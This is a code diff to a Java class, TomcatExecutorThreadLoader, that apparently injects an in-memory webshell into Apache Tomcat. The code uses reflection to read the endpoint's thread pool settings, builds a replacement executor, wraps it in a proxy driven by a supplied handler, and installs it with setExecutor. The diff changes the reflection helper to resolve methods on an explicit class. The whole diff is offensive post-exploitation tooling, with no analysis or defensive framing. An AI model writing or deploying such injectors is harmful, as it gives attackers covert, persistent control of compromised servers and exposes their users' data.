@@ -57,11 +57,11 @@ public class TomcatExecutorThreadLoader {
     public static void inject(Object nioEndpoint) throws Exception {
         Object threadPoolExecutor = getFieldValue(nioEndpoint, "executor");
 
-        Object var1 = invokeMethod(threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
-        Object var2 = invokeMethod(threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
-        Object var3 = invokeMethod(threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
+        Object var1 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
+        Object var2 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
+        Object var3 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
         Object var4 = TimeUnit.MILLISECONDS;
-        Object var5 = invokeMethod(threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});
+        Object var5 = invokeMethod(threadPoolExecutor.getClass(), threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});
 
         Class ThreadPoolExecutorClass = Class.forName("org.apache.tomcat.util.threads.ThreadPoolExecutor");
         Object executor = ThreadPoolExecutorClass.getConstructor(Integer.TYPE, Integer.TYPE, Long.TYPE, TimeUnit.class, BlockingQueue.class).newInstance(var1, var2, var3, var4, var5);
@@ -82,8 +82,7 @@ public class TomcatExecutorThreadLoader {
 
         Object resultObject = Proxy.newProxyInstance(TomcatExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class},(InvocationHandler) javaObject);
 
-        nioEndpoint.getClass().getSuperclass().getSuperclass().getMethod("setExecutor", Executor.class).invoke(nioEndpoint, resultObject);
-
+        invokeMethod(Class.forName("org.apache.tomcat.util.net.AbstractEndpoint"), nioEndpoint, "setExecutor", new Class[]{Executor.class}, new Object[]{resultObject});
     }
 
     public static byte[] decompress(String gzipObject) throws IOException {
@@ -121,13 +120,8 @@ public class TomcatExecutorThreadLoader {
         return field;
     }
 
-    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
-        try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
-        }
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
